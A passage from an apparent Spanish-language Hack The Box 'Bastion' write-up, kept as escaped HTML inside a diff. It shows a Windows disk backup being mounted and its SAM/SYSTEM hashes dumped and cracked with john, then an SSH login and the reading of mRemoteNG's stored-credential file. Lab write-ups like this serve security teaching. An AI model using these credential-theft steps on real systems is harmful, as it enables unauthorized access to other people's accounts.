+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd12
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd13
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd14
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd15
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd2
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd3
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd4
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd5
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd6
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd7
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd8
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd9
+❯ rmmod nbd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora si ya nos acepta el comando y luego ejecutamos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ qemu-nbd &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+qemu-nbd: Failed to open /dev/nbd0: No such file or directory
+qemu-nbd: Disconnect client, due to: Failed to &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;request: Unexpected end-of-file before all bytes were &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En caso de que nos salga este error, volvemos a ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;modprobe nbd max_part=16&lt;/code&gt; y otra vez &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;qemu-nbd -c /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd&lt;/code&gt; en donde el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vhd&lt;/code&gt; (&lt;strong&gt;&lt;em&gt;Virtual Hard Disk&lt;/em&gt;&lt;/strong&gt;) corresponde al más grande, es decir, el que pesa 5.0 GB:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ modprobe nbd &lt;span class=&quot;nv&quot;&gt;max_part&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;16
+❯ qemu-nbd &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora vamos a crearnos una montura del disco que lo tenemos en  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/nbd0&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /mnt/Bastion
+❯ mount /dev/nbd0p1 /mnt/Bastion
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Debemos de tener el disco virtual montado bajo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/Bastion&lt;/code&gt;, vamos a comprobarlo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/Bastion
+❯ ll
+drwxrwxrwx root root   0 B  Fri Feb 22 06:39:26 2019  &lt;span class=&quot;nv&quot;&gt;$Recycle&lt;/span&gt;.Bin
+lrwxrwxrwx root root  18 B  Mon Jul 13 23:53:55 2009  Documents and Settings ⇒ /mnt/Bastion/Users
+drwxrwxrwx root root   0 B  Mon Jul 13 21:37:05 2009  PerfLogs
+drwxrwxrwx root root 4.0 KB Mon Apr 11 21:21:18 2011  Program Files
+drwxrwxrwx root root 4.0 KB Mon Jul 13 23:53:55 2009  ProgramData
+drwxrwxrwx root root   0 B  Fri Feb 22 06:39:17 2019  Recovery
+drwxrwxrwx root root 4.0 KB Fri Feb 22 06:43:53 2019  System Volume Information
+drwxrwxrwx root root 4.0 KB Fri Feb 22 06:39:21 2019  Users
+drwxrwxrwx root root  16 KB Fri Feb 22 06:40:48 2019  Windows
+.rwxrwxrwx root root  24 B  Wed Jun 10 16:42:20 2009  autoexec.bat
+.rwxrwxrwx root root  10 B  Wed Jun 10 16:42:20 2009  config.sys
+.rwxrwxrwx root root 2.0 GB Fri Feb 22 06:38:21 2019  pagefile.sys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos una estructura de directorios de Windows; así que vamos a dirigirnos a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows/System32/config&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Windows/System32/config
+❯ ll
+drwxrwxrwx root root   0 B  Mon Jul 13 21:04:23 2009  Journal
+drwxrwxrwx root root   0 B  Fri Feb 22 06:37:28 2019  RegBack
+drwxrwxrwx root root 4.0 KB Sat Nov 20 14:48:09 2010  systemprofile
+drwxrwxrwx root root 4.0 KB Fri Feb 22 06:38:05 2019  TxR
+.rwxrwxrwx root root  28 KB Fri Feb 22 15:37:05 2019  BCD-Template
+.rwxrwxrwx root root  25 KB Fri Feb 22 15:37:05 2019  BCD-Template.LOG
+.rwxrwxrwx root root  30 MB Fri Feb 22 06:43:54 2019  COMPONENTS
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:54 2011  COMPONENTS.LOG
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  COMPONENTS.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  COMPONENTS.LOG2
+.rwxrwxrwx root root 1.0 MB Fri Feb 22 06:38:46 2019  COMPONENTS&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6cced2ec-6e01-11de-8bed-001e0bcd1824&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.TxR.0.regtrans-ms
+.rwxrwxrwx root root 1.0 MB Fri Feb 22 06:38:46 2019  COMPONENTS&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6cced2ec-6e01-11de-8bed-001e0bcd1824&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.TxR.1.regtrans-ms
+.rwxrwxrwx root root 1.0 MB Fri Feb 22 06:38:46 2019  COMPONENTS&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6cced2ec-6e01-11de-8bed-001e0bcd1824&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.TxR.2.regtrans-ms
+.rwxrwxrwx root root  64 KB Fri Feb 22 06:38:46 2019  COMPONENTS&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6cced2ec-6e01-11de-8bed-001e0bcd1824&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.TxR.blf
+.rwxrwxrwx root root  64 KB Fri Feb 22 06:38:21 2019  COMPONENTS&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6cced2ed-6e01-11de-8bed-001e0bcd1824&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.TM.blf
+.rwxrwxrwx root root 512 KB Fri Feb 22 06:38:21 2019  COMPONENTS&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6cced2ed-6e01-11de-8bed-001e0bcd1824&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.TMContainer00000000000000000001.regtrans-ms
+.rwxrwxrwx root root 512 KB Mon Jul 13 23:46:45 2009  COMPONENTS&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6cced2ed-6e01-11de-8bed-001e0bcd1824&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.TMContainer00000000000000000002.regtrans-ms
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  DEFAULT
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  DEFAULT.LOG
+.rwxrwxrwx root root  89 KB Fri Feb 22 06:43:54 2019  DEFAULT.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  DEFAULT.LOG2
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:39:21 2019  SAM
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  SAM.LOG
+.rwxrwxrwx root root  21 KB Fri Feb 22 06:39:21 2019  SAM.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SAM.LOG2
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  SECURITY
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  SECURITY.LOG
+.rwxrwxrwx root root  21 KB Fri Feb 22 06:43:54 2019  SECURITY.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SECURITY.LOG2
+.rwxrwxrwx root root  23 MB Fri Feb 22 06:43:54 2019  SOFTWARE
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:54 2011  SOFTWARE.LOG
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  SOFTWARE.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SOFTWARE.LOG2
+.rwxrwxrwx root root 9.3 MB Fri Feb 22 06:43:54 2019  SYSTEM
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:51 2011  SYSTEM.LOG
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  SYSTEM.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  SYSTEM.LOG2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dentro podemos encontrar los archivos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SAM&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYSTEM&lt;/code&gt;; que en conjunto podemos obtener los hashes de los usarios a nivel de sistema. Por lo tanto, haremos uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;samdump2&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ samdump2 SYSTEM SAM
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;disabled&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;disabled&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como ya tenemos hashes de los usuarios, vamos a tratar de romperlos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ john &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NT &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hashes
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NT &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 256/256 AVX2 8x3]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Warning: no OpenMP support &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this &lt;span class=&quot;nb&quot;&gt;hash type&lt;/span&gt;, consider &lt;span class=&quot;nt&quot;&gt;--fork&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8
+Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;disabled&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Administrator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+bureaulampje     &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;L4mpje&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+2g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2022-03-18 22:12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 3.076g/s 14454Kp/s 14454Kc/s 14462KC/s burg772v..burdy1
+Warning: passwords printed above might not be all those cracked
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show --format=NT&quot;&lt;/span&gt; options to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos la contraseña del usuario &lt;strong&gt;L4mpje&lt;/strong&gt; y como siempre, vamos a guardarlas para no olvidarlas despúes. Si recordamos, tenemos el puerto 22 abierto, por lo tanto vamos a tratar de conectarnos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh L4mpje@10.10.10.134
+L4mpje@10.10.10.134&lt;span class=&quot;s1&quot;&gt;'s password:
+Microsoft Windows [Version 10.0.14393]                                                                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+
+l4mpje@BASTION C:\Users\L4mpje&amp;gt;whoami                                                                                           
+bastion\l4mpje                                                                                                                  
+
+l4mpje@BASTION C:\Users\L4mpje&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya ingresamos a la máquina y podemos visualizar la flag (user.txt). Ahora vamos a enumerar un poco el sistema para ver la forma de escalar privilegios.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;4mpje&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;whoami /priv                                                                             
+
+PRIVILEGES INFORMATION                                                                                                          
+&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;                                                                                                          
+
+Privilege Name                Description                    State                                                              
+&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;                                                            
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                            
+SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Enabled                                                            
+
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;4mpje&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;4mpje&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;cd C:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;                                                                                  
+
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dir                                                                                                          
+ &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.                                                                                                
+ Volume Serial Number is 1B7D-E692                                                                                              
+
+ Directory of C:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;                                                                                                              
+
+19-03-2022  04:18    &amp;lt;DIR&amp;gt;          Backups                                                                                     
+12-09-2016  12:35    &amp;lt;DIR&amp;gt;          Logs                                                                                        
+22-02-2019  14:42    &amp;lt;DIR&amp;gt;          PerfLogs                                                                                    
+31-01-2022  17:39    &amp;lt;DIR&amp;gt;          Program Files                                                                               
+22-02-2019  14:01    &amp;lt;DIR&amp;gt;          Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                         
+22-02-2019  13:50    &amp;lt;DIR&amp;gt;          Users                                                                                       
+31-01-2022  17:52    &amp;lt;DIR&amp;gt;          Windows                                                                                     
+               0 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;              0 bytes                                                                                   
+               7 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   4.798.181.376 bytes free                                                                              
+
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;PROGRA~1                                                                                                  
+
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;ROGRA~1&amp;gt;dir                                                                                                  
+ Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.                                                                                                
+ Volume Serial Number is 1B7D-E692                                                                                              
+
+ Directory of C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;ROGRA~1                                                                                                       
+
+31-01-2022  17:39    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                           
+31-01-2022  17:39    &amp;lt;DIR&amp;gt;          ..                                                                                          
+16-04-2019  11:18    &amp;lt;DIR&amp;gt;          Common Files                                                                                
+23-02-2019  09:38    &amp;lt;DIR&amp;gt;          Internet Explorer                                                                           
+22-02-2019  14:19    &amp;lt;DIR&amp;gt;          OpenSSH-Win64                                                                               
+22-02-2019  14:08    &amp;lt;DIR&amp;gt;          PackageManagement                                                                           
+31-01-2022  17:39    &amp;lt;DIR&amp;gt;          VMware                                                                                      
+23-02-2019  10:22    &amp;lt;DIR&amp;gt;          Windows Defender                                                                            
+23-02-2019  09:38    &amp;lt;DIR&amp;gt;          Windows Mail                                                                                
+23-02-2019  10:22    &amp;lt;DIR&amp;gt;          Windows Media Player                                                                        
+16-07-2016  14:23    &amp;lt;DIR&amp;gt;          Windows Multimedia Platform                                                                 
+16-07-2016  14:23    &amp;lt;DIR&amp;gt;          Windows NT                                                                                  
+23-02-2019  10:22    &amp;lt;DIR&amp;gt;          Windows Photo Viewer                                                                        
+16-07-2016  14:23    &amp;lt;DIR&amp;gt;          Windows Portable Devices                                                                    
+22-02-2019  14:08    &amp;lt;DIR&amp;gt;          WindowsPowerShell                                                                           
+               0 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;              0 bytes                                                                                   
+              15 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   4.798.181.376 bytes free                                                                              
+
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;ROGRA~1&amp;gt;cd ..                                                                                                
+
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;PROGRA~2                                                                                                  
+
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;ROGRA~2&amp;gt;dir                                                                                                  
+ Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.                                                                                                
+ Volume Serial Number is 1B7D-E692                                                                                              
+
+ Directory of C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;ROGRA~2                                                                                                       
+
+22-02-2019  14:01    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                           
+22-02-2019  14:01    &amp;lt;DIR&amp;gt;          ..                                                                                          
+16-07-2016  14:23    &amp;lt;DIR&amp;gt;          Common Files                                                                                
+23-02-2019  09:38    &amp;lt;DIR&amp;gt;          Internet Explorer                                                                           
+16-07-2016  14:23    &amp;lt;DIR&amp;gt;          Microsoft.NET                                                                               
+22-02-2019  14:01    &amp;lt;DIR&amp;gt;          mRemoteNG                                                                                   
+23-02-2019  10:22    &amp;lt;DIR&amp;gt;          Windows Defender                                                                            
+23-02-2019  09:38    &amp;lt;DIR&amp;gt;          Windows Mail                                                                                
+23-02-2019  10:22    &amp;lt;DIR&amp;gt;          Windows Media Player                                                                        
+16-07-2016  14:23    &amp;lt;DIR&amp;gt;          Windows Multimedia Platform                                                                 
+16-07-2016  14:23    &amp;lt;DIR&amp;gt;          Windows NT                                                                                  
+23-02-2019  10:22    &amp;lt;DIR&amp;gt;          Windows Photo Viewer                                                                        
+16-07-2016  14:23    &amp;lt;DIR&amp;gt;          Windows Portable Devices                                                                    
+16-07-2016  14:23    &amp;lt;DIR&amp;gt;          WindowsPowerShell                                                                           
+               0 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;              0 bytes                                                                                   
+              14 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   4.798.181.376 bytes free                                                                              
+
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;ROGRA~2&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya vemos algo que nos llama la atención y es el programa &lt;strong&gt;mRemoteNG&lt;/strong&gt; y resulta que dicho programa contiene credenciales las cuales se pueden descifrar; por lo tanto nos vamos a la ruta del archivo de configuración:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;ROGRA~2&amp;gt;cd %HOME%/AppData/Roaming/mRemoteNG                                                                  
+
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;4mpje&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;oaming&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;RemoteNG&amp;gt;dir                                                                    
+ Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.                                                                                                
+ Volume Serial Number is 1B7D-E692                                                                                              
+
+ Directory of C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;4mpje&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;oaming&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;RemoteNG                                                                         
+
+22-02-2019  14:03    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                           
+22-02-2019  14:03    &amp;lt;DIR&amp;gt;          ..                                                                                          
+22-02-2019  14:03             6.316 confCons.xml                                                                                
+22-02-2019  14:02             6.194 confCons.xml.20190222-1402277353.backup                                                     
+22-02-2019  14:02             6.206 confCons.xml.20190222-1402339071.backup                                                     
+22-02-2019  14:02             6.218 confCons.xml.20190222-1402379227.backup                                                     
+22-02-2019  14:02             6.231 confCons.xml.20190222-1403070644.backup                                                     
+22-02-2019  14:03             6.319 confCons.xml.20190222-1403100488.backup                                                     
+22-02-2019  14:03             6.318 confCons.xml.20190222-1403220026.backup                                                     
+22-02-2019  14:03             6.315 confCons.xml.20190222-1403261268.backup                                                     
+22-02-2019  14:03             6.316 confCons.xml.20190222-1403272831.backup                                                     
+22-02-2019  14:03             6.315 confCons.xml.20190222-1403433299.backup                                                     
+22-02-2019  14:03             6.316 confCons.xml.20190222-1403486580.backup                                                     
+22-02-2019  14:03                51 extApps.xml                                                                                 
+22-02-2019  14:03             5.217 mRemoteNG.log                                                                               
+22-02-2019  14:03             2.245 pnlLayout.xml                                                                               
+22-02-2019  14:01    &amp;lt;DIR&amp;gt;          Themes                                                                                      
+              14 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         76.577 bytes                                                                                   
+               3 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   4.798.181.376 bytes free                                                                              
+
+l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;4mpje&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;oaming&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;RemoteNG&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;El archivo que nos interesa es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;confCons.xml&lt;/code&gt;, por lo tanto le echamos un ojo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;4mpje&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;oaming&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;RemoteNG&amp;gt;type confCons.xml                                                       
+&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;?&amp;gt;                                                                                           
+&amp;lt;mrng:Connections xmlns:mrng&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://mremoteng.org&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Connections&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Export&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;EncryptionEngine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AES&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;BlockCipherMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GC 
